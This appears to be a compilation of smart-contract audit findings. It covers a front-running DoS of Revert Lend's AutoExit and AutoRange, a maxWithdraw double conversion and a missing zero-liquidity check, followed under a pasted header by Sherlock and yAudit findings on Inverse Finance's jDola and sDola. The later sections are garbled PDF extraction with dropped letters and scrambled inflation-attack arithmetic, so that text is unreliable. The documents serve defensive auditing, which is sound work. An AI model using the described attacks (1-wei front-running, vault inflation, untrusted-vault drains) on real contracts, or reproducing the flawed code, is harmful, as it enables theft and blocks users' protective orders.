Auto-Range automates the process of rebalancing your liquidity positions. When the token price moves and your position goes out-of-range by your selected percentage, the system then automatically rebalances your position`

AutoExit contract

Auto-Exit lets you pre-configure a position so that the liquidity is automatically withdrawn when the pool price reaches a predetermined value. Moreover, you can optionally configure the system to swap from one token to the other on withdrawal, providing a safety net for your investments akin to a stop-loss order.

Both of those contracts implement an execute() function that respectively transforms an NFT position based on the parameters provided to it. It can only be called by revert controlled bots (operators) which owners have approved for their position or by the V3Vault through it’s transform() function.

The problem in both of those contracts is that the execute() function includes a validation that allows malicious users to DOS transaction execution and thus compromise the safety and integrity of the managed positions.

AutoExit::execute():

https://github.com/revert-finance/lend/blob/audit/src/automators/AutoExit.sol#L130

 function execute(ExecuteParams calldata params) external {

        ....       

 

        // get position info

        (,, state.token0, state.token1, state.fee, state.tickLower, state.tickUpper, state.liquidity,,,,) =

            nonfungiblePositionManager.positions(params.tokenId);


        ....

        

        // @audit can be front-run and prevent execution

        if (state.liquidity != params.liquidity) {

            revert LiquidityChanged();

        }


        ....

    }
AutoRange::execute():

https://github.com/revert-finance/lend/blob/audit/src/transformers/AutoRange.sol#L139

function execute(ExecuteParams calldata params) external {

        ....       

 

        // get position info

        (,, state.token0, state.token1, state.fee, state.tickLower, state.tickUpper, state.liquidity,,,,) =

            nonfungiblePositionManager.positions(params.tokenId);

        

        // @audit can be front-run and prevent execution

        if (state.liquidity != params.liquidity) {

            revert LiquidityChanged();

        }


        ....

    }
The problematic validation shared in both function is this one:

// @audit can be front-run and prevent execution

      if (state.liquidity != params.liquidity) {

          revert LiquidityChanged();

      }
The check is meant to ensure that the execution parameters the transaction was initiated with, are executed under the same conditions (the same liquidity) that were present when revert bots calculated them off-chain.

The main issue here arises from the fact that liquidity of a position inside NonfungiblePositionManager can be manipulated by anyone. More specifically NonfungiblePositionManager::increaseLiquidity() can be called freely, which means that liquidity can be added to any NFT position without restriction.

This can be validated by looking at NonfungiblePositionManager::increaseLiquidity():

https://github.com/Uniswap/v3-periphery/blob/697c2474757ea89fec12a4e6db16a574fe259610/contracts/NonfungiblePositionManager.sol#L198C14-L198C31

 function increaseLiquidity(IncreaseLiquidityParams calldata params)

        external

        payable

        override     //<---------- No `isAuthorizedForToken` modifier - anyone can call

        checkDeadline(params.deadline)

        returns (

            uint128 liquidity,

            uint256 amount0,

            uint256 amount1

        )

    { ... }


....


function decreaseLiquidity(DecreaseLiquidityParams calldata params)

        external

        payable

        override

        isAuthorizedForToken(params.tokenId) // <------- Only position owner can call

        checkDeadline(params.deadline)

        returns (uint256 amount0, uint256 amount1)

    { ... }
All of this allows any attacker to exploit the check at practically zero cost.

POC
I’ve coded a POC to prove how for the cost of 1 wei (basically free) an attacker prevents a stop loss order for a position from being executed.

I’ve added the following test to AutoExit.t.sol, reusing the logic from the testStopLoss() test:

Details
Recommended mitigation steps
Consider removing the problematic check from both functions, since it can cause more harm than good in this particular scenario.

Assessed type
DoS

kalinbas (Revert) confirmed, but disagreed with severity and commented:

We agree with this finding and will remove the check. But this should be at max a medium risk as there is no direct loss of funds. It’s more of a DOS (which could be resolved by using flashbots for example).

b0g0 (warden) commented:

This finding includes the AutoExit.sol case where a DOS leads to a significantly more serious impact. Here are the arguments AutoExit.sol is documented to:

Lets a v3 position to be automatically removed (limit order) or swapped to the opposite token (stop loss order) when it reaches a certain tick.

Here are short definitions of the 2 operations from Investopedia:

Limit Order definition

A limit order guarantees that an order is filled at or better than a specific price level. Limit orders can be used in conjunction with stop orders to prevent large downside losses.

Stop Loss definition

A stop-loss is designed to limit an investor’s loss on a security position that makes an unfavorable move.

Both of those operations are very time-bound, especially the Stop Loss order, where the idea is that the position owner configures a threshold at which he should exit the market or else his position will sustain losses. In case the price (ticks) drop below that threshold, DOSing execution even for a shorter amount of time can seriously affect the position, especially if it is a big one and the market is very active and volatile (like in a bull run) - the longer the position does NOT exit the market, the greater the losses.

DOSing here will not cost much compared to how it can affect a position.

ronnyx2017 (judge) decreased severity to Medium and commented:

I think the attack in AutoExit is more convincing, although passing specific parameters in auto range might produce a similar effect. However, since this exploitation is based on MEV, we should assume that the parameters in the original tx are not edge. This report elaborates more thoroughly on the exploitation scenarios and impacts, giving me the confidence to mark it as Medium.

Note: For full discussion, see here.

V3Vault::maxWithdrawal incorrectly converts balance to assets
Submitted by b0g0, also found by ktg and thank_you

Severity: Medium

The maxWithdrawal() function of V3Vault calculates the maximum amount of underlying tokens an account can withdraw based on the shares it owns.

The initial problem with maxWithdrawal() and V3Vault overall was that they were not implemented according to the specs of ERC-4626 standard as outlined in the original issue. In the case of maxWithdrawal() it did not consider the following part of the spec:

MUST factor in both global and user-specific limits, like if withdrawals are entirely disabled (even temporarily) it MUST return 0.

In order to remediate the issue and make the V3Vault ERC-4626 compliant, protocol devs prepared this PR, where maxWithdrawal() was refactored so that it includes the actual daily limit that is applied when withdrawing assets:

https://github.com/revert-finance/lend/blob/audit/src/V3Vault.sol#L335-L347

 function maxWithdraw(address owner) external view override returns (uint256) {

-        (, uint256 lendExchangeRateX96) = _calculateGlobalInterest();

-        return _convertToAssets(balanceOf(owner), lendExchangeRateX96, Math.Rounding.Down);


+        (uint256 debtExchangeRateX96, uint256 lendExchangeRateX96) = _calculateGlobalInterest();


+        uint256 ownerShareBalance = balanceOf(owner);

+        uint256 ownerAssetBalance = _convertToAssets(ownerShareBalance, lendExchangeRateX96, Math.Rounding.Down);


+        (uint256 balance, ) = _getBalanceAndReserves(debtExchangeRateX96, lendExchangeRateX96);

+        if (balance > ownerAssetBalance) {

+            return ownerAssetBalance;

+        } else {

+            return _convertToAssets(balance, lendExchangeRateX96, Math.Rounding.Down);

+        }

    }
The problem with the new code is this part:

   // @audit balance is already converted to assets

   (uint256 balance, ) = _getBalanceAndReserves(debtExchangeRateX96, lendExchangeRateX96);


    // @audit - converts to assets a second time

    } else {

        return _convertToAssets(balance, lendExchangeRateX96, Math.Rounding.Down);

    }
If we take a look at _getBalanceAndReserves() we can see that the returned balance is already converted to assets:

https://github.com/revert-finance/lend/blob/audit/src/V3Vault.sol#L1107-L1116

function _getBalanceAndReserves(uint256 debtExchangeRateX96, uint256 lendExchangeRateX96)

        internal

        view

        returns (uint256 balance, uint256 reserves)

    {

 --->       balance = totalAssets();

        uint256 debt = _convertToAssets(debtSharesTotal, debtExchangeRateX96, Math.Rounding.Up);

        uint256 lent = _convertToAssets(totalSupply(), lendExchangeRateX96, Math.Rounding.Up);

        reserves = balance + debt > lent ? balance + debt - lent : 0;

    }
This means that maxWithdraw() improperly converts balance a second time and will overinflate the result, especially when debtExchangeRateX96 is high.

Impact
V3Vault::maxWithdraw() inflates the actual amount that can be withdrawn, which can impact badly protocols and contracts integrating with the vault. The possibility is quite real considering that maxWithdraw() is part of the official ERC-4626 which is very widely adopted.

Recommended mitigation steps
Refactor V3Vault::maxWithdraw() so that it does not convert balance to assets a second time:

  function maxWithdraw(address owner) external view override returns (uint256) {

        ....

        if (balance > ownerAssetBalance) {

            return ownerAssetBalance;

        } else {

-            return _convertToAssets(balance, lendExchangeRateX96, Math.Rounding.Down);

+            return balance

        }

    }
Assessed type
Math

kalinbas (Revert) confirmed

Some functions don’t check if liquidity > 0 before calling decreaseLiquidity
Submitted by ktg

Severity: Medium

https://github.com/revert-finance/lend/blob/audit/src/V3Vault.sol#L654-L658

Impact
Users cannot just collect UniswapV3 fees alone.
Users cannot call leverageDown with fee alone.
Proof of concept
One of the most important features of Revert Lend is that it allows user to take loans using UniswapV3 positions as collateral while at the same time able to manage their positions; this includes collecting fees, decrease liquidity, increase liquidity, as documented here

However, the current implementation will not allow user to just collect fees. V3Vault contains a function called decreaseLiquidityAndCollect:

function decreaseLiquidityAndCollect(DecreaseLiquidityAndCollectParams calldata params)

        external

        override

        returns (uint256 amount0, uint256 amount1)

    {

     ...

     (amount0, amount1) = nonfungiblePositionManager.decreaseLiquidity(

            INonfungiblePositionManager.DecreaseLiquidityParams(

                params.tokenId, params.liquidity, params.amount0Min, params.amount1Min, params.deadline

            )

        );

     ...

    }
As you can see in the above code, the function will call decreaseLiquidity without checking if liquidity to be removed >0; if liquidity = 0, then decreaseLiquidity will revert. Below is the UniswapV3 NonfungibleTokenManager code for this situation:

https://github.com/Uniswap/v3-periphery/blob/main/contracts/NonfungiblePositionManager.sol#L265

 function decreaseLiquidity(DecreaseLiquidityParams calldata params)

        external

        payable

        override

        isAuthorizedForToken(params.tokenId)

        checkDeadline(params.deadline)

        returns (uint256 amount0, uint256 amount1)

    {

        require(params.liquidity > 0);

}
Using V3Utils transformation will not allow users to just collect fees either. The function V3Utils.execute does check if liquidity >0 and collect fees:

function execute(uint256 tokenId, Instructions memory instructions) public returns (uint256 newTokenId) {

        _validateCaller(nonfungiblePositionManager, tokenId);


        (,, address token0, address token1,,,, uint128 liquidity,,,,) = nonfungiblePositionManager.positions(tokenId);


        uint256 amount0;

        uint256 amount1;

        if (instructions.liquidity != 0) {

            (amount0, amount1) = _decreaseLiquidity(

                tokenId,

                instructions.liquidity,

                instructions.deadline,

                instructions.amountRemoveMin0,

                instructions.amountRemoveMin1

            );

        }

        (amount0, amount1) = _collectFees(

            tokenId,

            IERC20(token0),

            IERC20(token1),

            instructions.feeAmount0 == type(uint128).max

                ? type(uint128).max

                : (amount0 + instructions.feeAmount0).toUint128(),

            instructions.feeAmount1 == type(uint128).max

                ? type(uint128).max

                : (amount1 + instructions.feeAmount1).toUint128()

        );

}
However, after this V3Utils only supports 3 modes and each of these forces users to do something else beside collecting fees:

CHANGE_RANGE mode forces users to mint a new UniswapV3 position.
WITHDRAW_AND_COLLECT_AND_SWAP forces users to swap tokens.
COMPOUND_FEES forces users to use all collected fee to increase liquidity.
In summary, V3Vault and V3Utils won’t let users collect their positions fees alone; an important feature in Revert Lend system.

One more part this is not checked is in function LeverageTransformer.leverageDown:

function leverageDown(LeverageDownParams calldata params) external {

...

INonfungiblePositionManager.DecreaseLiquidityParams memory decreaseLiquidityParams = INonfungiblePositionManager

            .DecreaseLiquidityParams(

            params.tokenId, params.liquidity, params.amountRemoveMin0, params.amountRemoveMin1, params.deadline

        );

        (amount0, amount1) = nonfungiblePositionManager.decreaseLiquidity(decreaseLiquidityParams);

...

}
If a user pass in LeverageDownParams.liquidity = 0, that means they just want to use UniswapV3 collect fees to repay their debt in V3Vault, yet in this situation they are forced to decrease their position.

Below is a POC for this issue, save this test case to file V3Oracle.t.my.sol and run it using command:

forge test --match-path test/integration/V3Vault.t.sol --match-test testCannotCollect -vvvv

function testCannotCollect() external {

        uint256 minLoanSize = 1000000;


        vault.setLimits(1000000, 15000000, 15000000, 15000000, 15000000);


        // lend 10 USDC

        _deposit(10000000, WHALE_ACCOUNT);


        // add collateral

        vm.startPrank(TEST_NFT_ACCOUNT);

        NPM.approve(address(vault), TEST_NFT);


        vault.create(TEST_NFT, TEST_NFT_ACCOUNT);

        // Borrow

        vault.borrow(TEST_NFT, minLoanSize);


        // Cannot just collect by setting decrease liquidity = 0

        IVault.DecreaseLiquidityAndCollectParams memory params = IVault.DecreaseLiquidityAndCollectParams(

            TEST_NFT,

            0, // liquidity to remove

            0,

            0,

            type(uint128).max,

            type(uint128).max,

            block.timestamp,

            TEST_NFT_ACCOUNT

        );

        vm.expectRevert();

        vault.decreaseLiquidityAndCollect(params);


        // Users are forced to remove some liquidity

        params = IVault.DecreaseLiquidityAndCollectParams(

            TEST_NFT,

            1, // liquidity to remove

            0,

            0,

            type(uint128).max,

            type(uint128).max,

            block.timestamp,

            TEST_NFT_ACCOUNT

        );

        vault.decreaseLiquidityAndCollect(params);


        vm.stopPrank();




    }
Recommended Mitigation
In function V3Vault.decreaseLiquidityAndCollect, the code should check if liquidity > 0, if not, decreaseLiquidity should not be called. This allow the user to collect fees.

Assessed type
Invalid Validation

kalinbas (Revert) confirmed, but disagreed with severity and commented:

There is no medium risk here, in my opinion. But yes, it is a good finding.

ktg (warden) commented:

In my opinion, this does qualify as medium risk because it forces the users to decrease their liquidity in order to collect their fees. In this issue, one of the main features of the protocol (that is allowing collecting fees alone, or allowing to use only fees for leverageDown) is affected.

kalinbas (Revert) commented:

Yeah I agree, it is a main feature. But with V3Utils you can collect fees only when liquidity == 0. So it is actually possible to collect fees only. I keep my opinion this should not be a medium risk.

WITHDRAW_AND_COLLECT_AND_SWAP doesnt force them to swap.

ktg (warden) commented:

xYou’re totally right, I’m sorry I’m mistaken, WITHDRAW_AND_COLLECT_AND_SWAP doesnt force them to swap. Now, the only problem is leverageDown forces user to decrease liquidity but I understand if you keep your opinion.

ronnyx2017 (judge) commented:

I am more inclined to maintain the Medium severity. Although this issue does not cause any value leakage, the standalone fee collection is a key function, which meets the criteria for key functionality errors.




### BELOW IS THE IMPORTANT PAST MONOLITH AUDITS:

Issue H-1: Anyone can steal all jDola from Withdraw
 alEscrow [RESOLVED]
 Source: https://github.com/sherlock-audit/2025-10-inverse-finance-oct-13th/issues/5
 Summary
 The withdraw escrow trusts any vault address passed to queueWithdrawal and treats it as
 anERC4626without validating it is a known/benign implementation.
 Vulnerability Detail
 WhenwithdrawFeeBps > 0, the escrow executes a fee flowthat:
 1. calls _vault.redeem(fee, address(this), address(this)) on the untrusted vault
 anduses the returned value as amount to a ERC20.approve call
 2. reads _vault.asset() (also controlled by the untrusted vault),
 3. approves the amountfrom1. returned token to the untrusted vault for dolaRedeemed
 Because the escrow:
 • doesnotwhitelist vaults,
 • doesnotbindavaulttoapre-verified asset,
 • uses anapprove-then-pull pattern to an untrusted contract right after external
 calls, the attacker can drain escrow-held tokens (e.g., user shares waiting to
 withdraw) in a single call when fees are enabled.
 PoChttps://gist.github.com/NicolaMirchev/635376aafae7e1205d4f1b6ba542d139
 Impact
 Theftofall jDola tokens in withdrawEscrow
 CodeSnippet
 https://github.com/sherlock-audit/2025-10-inverse-finance-oct-13th/blob/dd8b7945118
 1409793a3f85da0a75d37dff7598d/InverseFinance__JuniorDola/src/WithdrawalEscrow.s
 ol#L101-L103
 Tool Used
 Manual Review
 4
Recommendation
 Implement a vault whitelisting
 5
IssueM-1: queueWithdrawalredeemwon'tworkwith
 amount = 0andblock.timestamp <= exitWindowSta
 rt [RESOLVED]
 Source: https://github.com/sherlock-audit/2025-10-inverse-finance-oct-13th/issues/6
 Summary
 queueWithdrawal redeem won't work with amount = 0 andblock.timestamp <= exitWindow
 Start
 Vulnerability Detail
 Users can renew their withdrawals by calling queueWithdrawal with amount = 0, this
 comentstates this
 //To renew a withdrawal, queue a 0 amount withdrawal
 function queueWithdrawal(address vault, uint amount) external nonReentrant {
 ...
 The issue is that if withdrawFeeBps > 0 then a fee will be applied.
 if(withdrawFeeBps > 0){
 //If user has had a chance to withdraw, we apply full fee, otherwise
 only apply fee on new amount
 →
 fee = totalWithdrawAmount > amount && block.timestamp > exitWindowStart ?
 totalWithdrawAmount * withdrawFeeBps / 10000 :
 amount * withdrawFeeBps / 10000;
 totalWithdrawAmount-= fee;
 }
 If a user is trying to renew his withdraw, then totalWithdrawAmount > amount will always
 betrue, since he already has a queued withdraw and block.timestamp > exitWindowStar
 t in this case will be false, he is trying to renew his window prior to his window's start.
 In this the fee is applied to amount, since amount = 0 no fee is applied.
 The issue is when fee is attempted to beredeemed.
 if(withdrawFeeBps > 0){
 //@lead can potentially `reedem` 0 here, which will fail
 uint dolaRedeemed = _vault.redeem(fee, address(this), address(this));
 _vault.asset().approve(vault, dolaRedeemed);
 _vault.donate(dolaRedeemed);
 }
 6
Redeeming 0is impossible, because of how redeem works.
 function redeem(
 uint256 shares,
 address receiver,
 address owner
 ) public virtual returns (uint256 assets) {
 if (msg.sender != owner) {
 uint256 allowed = allowance[owner][msg.sender]; // Saves gas for
 limited approvals.
 →
 →
 if (allowed != type(uint256).max) allowance[owner][msg.sender] =
 allowed- shares;
 }
 // Check for rounding error since we round down in previewRedeem.
 require((assets = previewRedeem(shares)) != 0, "ZERO_ASSETS");
 previewRedeem does the following
 →
 function convertToAssets(uint256 shares) public view virtual returns (uint256) {
 uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is
 non-zero.
 return supply == 0 ? shares : shares.mulDivDown(totalAssets(), supply);
 }
 0 multiplied by something then divided by something is always 0, so previewRedeem
 returns 0 and the tx reverts. This punishes users, as they can't renew their window prior to
 their current window's start, thus they are always forced to pay a fee for the second time,
 it also breaks the invariant of letting users renew their window whenever possible.
 Impact
 Renewing queue withdrawals doesn't work as intented
 CodeSnippet
 https://github.com/sherlock-audit/2025-10-inverse-finance-oct-13th/blob/dd8b7945118
 1409793a3f85da0a75d37dff7598d/InverseFinance__JuniorDola/src/WithdrawalEscrow.s
 ol#L99-L103
 Tool Used
 Manual Review
 7
Recommendation
 Changethefeeredemption to the following
 if(withdrawFeeBps > 0 && fee > 0){
 uint dolaRedeemed = _vault.redeem(fee, address(this), address(this));
 _vault.asset().approve(vault, dolaRedeemed);
 _vault.donate(dolaRedeemed);
 }
 Extra safe would be like so.
 uint preview = _vault.previewRedeem(fee);
 if (withdrawFeeBps > 0 && fee > 0 && preview > 0) { ... }
 This way anypossible to 0 rounding will also be handled and will allow users to queue.
 8
Issue L-1: Broken invariant totalAssets() < MIN_AS
 SETS in jDola::slash [RESOLVED]
 Source: https://github.com/sherlock-audit/2025-10-inverse-finance-oct-13th/issues/7
 Summary
 Basically the invariant will not hold if everything is slashed (first if branch):
 function slash(uint amount) external onlySlashingModule() returns(uint) {
 //Make sure slashed amount doesn't exceed total supply
 //TODO: Add logic to handle still accruing revenue
 if(totalAssets() < amount){
 amount = totalAssets(); // @sus this may result in breaking the invariant
 `totalAssets() < MIN_ASSETS`
 →
 →
 //Make sure slashed amount doesn't leave junior tranche with less assets than
 MIN_ASSETS
 //TODO: Consider allowing 0 assets
 }
 Andthenprevweekrevenueis accumulated such that the amountis < MIN_ASSETS:
 →
 function totalAssets() public view override returns (uint) { // @ok
 uint week = block.timestamp / 7 days;
 uint timeElapsed = block.timestamp % 7 days;
 uint remainingLastRevenue = weeklyRevenue[week- 1] * (7 days- timeElapsed) /
 7 days;
 →
 uint actualAssets = asset.balanceOf(address(this))- remainingLastRevenue
weeklyRevenue[week];
 return actualAssets < MAX_ASSETS ? actualAssets : MAX_ASSETS;
 }
 It is also reachable if we shash eveything (we don't enter if, if else) and then totalAsse
 ts increases just below the MIN_ASSETS because of the prev weekly distribution
 Impact
 Having totalAssets() > 0 && totalAssets() < MIN_ASSETS
 CodeSnippet
 https://github.com/sherlock-audit/2025-10-inverse-finance-oct-13th/blob/dd8b7945118
 1409793a3f85da0a75d37dff7598d/InverseFinance__JuniorDola/src/jDola.sol#L176-L186
 9
Tool Used
 Manual Review
 Recommendation
 Ensure that the invariant holds. If weeklyRevenue[last week] >= 1d18, distribute the
 amountof1e18 instantly and withdraw it from weeklyRevenue[last week], if we are
 slashing all the assets
 Discussion
 08xmt
 Decided it's safer to make MIN_ASSETS + remaining revenue unslashable. In any given
 weekthis is unlikely to be an impactful amount.
 10
Issue L-2: LackofsetOperatorfunctioninthejDola
 contract [RESOLVED]
 Source: https://github.com/sherlock-audit/2025-10-inverse-finance-oct-13th/issues/8
 Summary
 The jDola contract does not have a function to change the operator address after
 deployment.
 As aresult the operator's address can never be updated post deployment, even in
 emergency scenarios (for example if the operator turns malicious)
 Recommendation
 Consider adding a setOperator(address _operator) function with the onlyGov modifier
 to allow governance to update the operator role.
 11
IssueL-3: Userscannotspecifyamaximumwithdraw
 delay whenwithdrawing[RESOLVED]
 Source: https://github.com/sherlock-audit/2025-10-inverse-finance-oct-13th/issues/9
 Summary
 The WithdrawalEscrow contract determines each user's withdrawal delay dynamically
 through the withdrawDelayModel, without allowing users to specify their own maximum
 acceptable delay.
 Vulnerability Detail
 Whenmultiple users queue withdrawals at the same time, those whose transactions are
 processed later may receive unexpectedly significantly longer withdrawal delays than
 the earlier users. Since the contract does not allow users to set a maximum acceptable
 delay, their transactions will still execute even if the resulting lockup period becomes
 unexpectedly long.
 Impact
 Under specific conditions (high withdrawal activity in a short period of time), some users
 mayfaceunexpectedly long lockups
 CodeSnippet
 https://github.com/sherlock-audit/2025-10-inverse-finance-oct-13th/blob/dd8b7945118
 1409793a3f85da0a75d37dff7598d/InverseFinance__JuniorDola/src/WithdrawalEscrow.s
 ol#L65
 Tool Used
 Manual Review
 Recommendation
 Consider adding a parameter that allows users to specify a maximum acceptable
 withdrawal delay, and revert the transaction if the calculated delay exceeds this limit


 yAudit Inverse Finance Dola savings
 Review
 Review Resources:
 Code repositories and documentation were used during this audit.
 Auditors:
 adriro
 pandadefi
 Table of Contents
 Review Summary
 Scope
 Code Evaluation Matrix
 Findings Explanation
 High Findings
 1. High - sDola vault is susceptible to the inflation a ack
 Technical Details
 Impact
 Recommendation
 Developer Response
 2. High - 
sDola should not be alowed to be borrowed in a lending borrowing market
 Technical Details
 Impact
 Recommendation
Developer Response
 Low Findings
 1. Low - Consider implementing two-step procedure for updating protocol addresses
 Technical Details
 Impact
 Recommendation
 Developer Response
 2. Low - Missing checks for address(0) on stake() recipient
 Technical Details
 Impact
 Recommendation
 Developer Response
 3. Low - buyDBR() call with incorrect exactDbrOut might lead to overpaying for dbr
 Technical Details
 Impact
 Recommendation
 Developer Response
 4. Low - Incorrect overflow check in maxYearlyRewardBudget
 Technical Details
 Impact
 Recommendation
 Developer Response
 5. Low - Missing sweep() function as part of sDola contract
 Technical Details
 Impact
 Recommendation
 Developer Response
 Gas Saving Findings
 1. Gas - Unnecessary call to getDbrReserve() in buyDBR()
 Technical Details
Impact
 Recommendation
 Developer Response
 2. Gas - Cache storage variables in reward calculation logic
 Technical Details
 Impact
 Recommendation
 Developer Response
 3. Gas - In getDolaReserve() add an option to pass getDbrReserve()
 Technical Details
 Impact
 Recommendation
 Developer Response
 4. Gas - Week elapsed time calculation can be simplified
 Technical Details
 Impact
 Recommendation
 Developer Response
 Informational Findings
 1. Informational - Missing limits when se ing max amounts
 Technical Details
 Impact
 Recommendation
 Developer Response
 2. Informational - Missing event for a critical parameter change
 Technical Details
 Impact
 Recommendation
 Developer Response
3. Informational - 
public functions not caled by the contract should be declared
 external instead
 Technical Details
 Impact
 Recommendation
 Developer Response
 4. Informational - 
else block unnecessary
 Technical Details
 Impact
 Recommendation
 Developer Response
 Final remarks
 Review Summary
 Dola Savings
 DolaSavings is a staking platform alowing users to earn rewards by depositing DOLA tokens. It
 aims to promote long-term holding by distributing DBR tokens based on the duration and
 amount of DOLA staked.
 The contracts of the Dola savings Repo were reviewed over 3 days. The code review was
 performed by 2 auditors between January 4th and January 7th, 2024. The repository was
 under active development during the review, but the review was limited to the latest commit at
 the start of the review. This was commit 5c38feed71ef71425ecd6b121574220e94ab8f8d for
 the Dola savings repo.
 Scope
 The scope of the review consisted of the folowing contracts at the specific commit:
 src/DolaSavings.sol
 src/sDola.sol
 src/sDolaHelper.sol
A er the findings were presented to the Dola savings team, fixes were made and included in
 several PRs.
 This review is a code review to identify potential vulnerabilities in the code. The reviewers did
 not investigate security practices or operational security and assumed that privileged
 accounts could be trusted. The reviewers did not evaluate the security of the code relative to a
 standard or specification. The review may not have identified all potential a ack vectors or
 areas of vulnerability.
 yAudit and the auditors make no warranties regarding the security of the code and do not
 warrant that the code is free from defects. yAudit and the auditors do not represent nor imply
 to third parties that the code has been audited nor that the code is free from defects. By
 deploying or using the code, Inverse Finance and users of the contracts agree to use the code
 at their own risk.
 Category Mark Description
 Access Control Good Follows standard practices.
 Mathematics Good Calculations are accurate with proper overflow
 checks.
 Complexity Good Code is well-organized and modular.
 Libraries Good Uses well-tested libraries without modifications.
 Decentralization Good User funds are safe from governance actions.
 Code stability Good Stable with no known issues in the current
 environment.
 Documentation Low Functions are lacking NatSpec comments.
 Monitoring Low Missing events on state variable changes.
 Testing and
 verification Average Adequate tests cover major functionalities.
 Code Evaluation Matrix
Findings Explanation
 Findings are broken down into sections by their respective impact:
 Critical, High, Medium, Low impact
 These are findings that range from a acks that may cause loss of funds, impact
 control/ownership of the contracts, or cause any unintended consequences/actions
 that are outside the scope of the requirements.
 Gas savings
 Findings that can improve the gas e ciency of the contracts.
 Informational
 Findings including recommendations and best practices.
 High Findings
 1. High - sDola vault is susceptible to the inflation a ack
 The first depositor in the sDola.sol contract can inflate the value of a share to cause rounding
 issues in subsequent deposits.
 Technical Details
 The sDola ERC4626 vault is susceptible to a vulnerability known as the Inflation A ack, in
 which the first depositor can be front-run by an a acker to steal their deposit.
 Let’s imagine a user wants to deposit X amount of DOLA in sDola.
 1
 2
 3
 The a acker deposits 1 wei of DOLA in sDola, they own 1 share of sDOLA.
 The a acker stakes 
X / 2 DOLA in DolaSaving on behalf of the sDola vault, now total
 assets in sDola are 
X / 2 + 1.
 The user deposit transaction goes through, they are minted 
1) ) = 1 share.
 4
 The a acker redeems their share of sDOLA and receives 
profit is 
3/4 * X - X / 2 - 1 = X / 4 - 1.
 roundDown( X * 1 / (X / 2 +
 (X + X / 2) / 2 = 3/4 * X. Their
I mpact
 High. An a acker can steal part of the initial deposit in the vault.
 Recommendation
 There are di erent ways to mitigate this a ack. One of the simplest alternatives is to mint an
 initial set of dead shares when the vault is deployed so that the a ack would become
 impractical to perform.
 Developer Response
 Addressed in h ps://github.com/InverseFinance/dola-savings/pul/9/files.
 2. High - 
sDola should not be allowed to be borrowed in a lending borrowing
 market
 The 
sDola price can be manipulated with deposits to 
contract.
 Technical Details
 DolaSavings on the behalf of 
sDola
 When an asset whose price can be manipulated atomicaly is used as colateral and borrowed,
 the lending market is at risk. If a large deposit is made to 
DolaSavings in the name of the 
sDola
 contract, it artificialy inflates the value of sDola. This can lead to a scenario where the borrower
 can borrow more than the actual colateral value. See: cream finance hack
 I mpact
 High. sDola can’t be borrowed.
 Recommendation
 Document the issue, and make sure protocol integrators are aware of the pitfals of using
 sDola.
 Developer Response
 Addressed in h ps://github.com/InverseFinance/dola
savings/pul/8/commits/0c8f83a4afa5cb25513ed74060cf369ddd55d982.
 Low Findings
 1. Low - Consider implementing two-step procedure for updating protocol
 addresses
 A copy-paste error or a typo may end up bricking protocol operability.
Technical Details
 The gov state variable is key to the protocol governance.
 71 | function setGov(address _gov) public onlyGov { gov = _gov; }
 DolaSavings.sol#L71
 100 | function setGov(address _gov) external onlyGov {
 101 |         
102 |     
}
 gov = _gov;
 sDola.sol#L100
 I mpact
 Low. Uploading protocol governance needs to be done with extra care.
 Recommendation
 Add a two-step governance address update.
 Developer Response
 Addressed in h ps://github.com/InverseFinance/dola-savings/pul/4.
 2. Low - Missing checks for 
address(0) on 
Funds can be staked by mistake to the 
Technical Details
 90|    
stake() 
address(0).
 recipient
 function stake(uint amount, address recipient) public updateIndex(recipient) {
 91|        
balanceOf[recipient] += amount;
 92|        
totalSupply += amount;
 93|        
94|    
}
 dola.transferFrom(msg.sender, address(this), amount);
 DolaSavings.sol#L91
I mpact
 Low. Funds can be lost.
 Recommendation
 Add a check to make sure the recipient isn’t 
Developer Response
 address(0).
 Addressed h ps://github.com/InverseFinance/dola-savings/pul/4.
 3. Low - 
buyDBR() call with incorrect 
exactDbrOut might lead to overpaying for
 dbr
 With 
buyDBR() taking 
misused 
exactDolaIn and 
exactDbrOut as parameters, it’s possible that a user
 exactDbrOut is not ideal at the moment the transaction is mined. This wil have the
 user paying extra 
DolaIn.
 Technical Details
 The 
exactDbrOut amount might be di erent from the ideal amount because of changes on
 chain or a mistake from the user.
 sDola.sol#L88-L98
 I mpact
 Low. Users should use the helper contracts.
 Recommendation
 Document the existence of the helper contract for users to interact with.
 Developer Response
 4. Low - Incorrect overflow check in 
The check in 
maxYearlyRewardBudget
 setMaxYearlyRewardBudget() is presumably incorrect as the associated comment
 reads:
 cannot overflow and revert within 10,000 years
Technical Details
 Accrued rewards are calculated in 
36:                 
updateIndex according to the folowing formula:
 uint maxBudget = maxRewardPerDolaMantissa * totalSupply / mantissa;
 37:                 
uint budget = yearlyRewardBudget > maxBudget ? maxBudget : 
yearlyRewardBudget;
 38:                 
uint rewardsAccrued = deltaT * budget * mantissa / 365 days;
 Line 38 wil overflow if 
deltaT * budget * mantissa > 2**256 - 1, hence we need 
2**256 - 1 / (deltaT * mantissa).
 If the intention is to support up to 10 years, then the check in 
budget <
 setMaxYearlyRewardBudget()
 should be 
_max < type(uint).max / (365 days * 10 * mantissa).
 I mpact
 Low.
 Recommendation
 Adjust the overflow check in 
Developer Response
 setMaxYearlyRewardBudget().
 Addressed in h ps://github.com/InverseFinance/dola-savings/pul/5.
 5. Low - Missing 
sweep() function as part of 
sDola contract
 The 
sDola contract doesn’t have a 
sweep() function.
Technical Details
 Unlike 
DolaSaving, it’s not possible to recover tokens sent by mistake due to the lack of a
 sweep() function. The contract should only have 
dbr tokens; other tokens should be
 recoverable by the governance multisig account.
 I mpact
 Low. Funds sent by mistake would be lost.
 Recommendation
 +    function sweep(address token, uint amount, address to) public onlyGov {
 +        require(address(dbr) != token, "Not authorized");
 +        IERC20(token).transfer(to, amount);
 +    }
 Developer Response
 Addressed in h ps://github.com/InverseFinance/dola-savings/pul/6.
 Gas Saving Findings
 1. Gas - Unnecessary call to 
getDbrReserve() in 
buyDBR()
 getDbrReserve() cals the saving contract on the 
claimable() function. A claim to the saving
 contract is done right before the cal to 
claimable(), which wil then always return zero.
 Technical Details
 89|        
90|        
savings.claim(address(this));
 uint dolaReserve = getDolaReserve() + exactDolaIn;
 91|        
uint dbrReserve = getDbrReserve() - exactDbrOut;
 sDola.sol#L89-L91
I mpact
 Gas savings.
 Recommendation
 Replace line 91 by-         uint dbrReserve = getDbrReserve() - exactDbrOut;
 +         uint dbrReserve = dbr.balanceOf(address(this)) - exactDbrOut;
 Since 
getDolaReserve() is also caling 
getDbrReserve() it is also possible to save even more gas
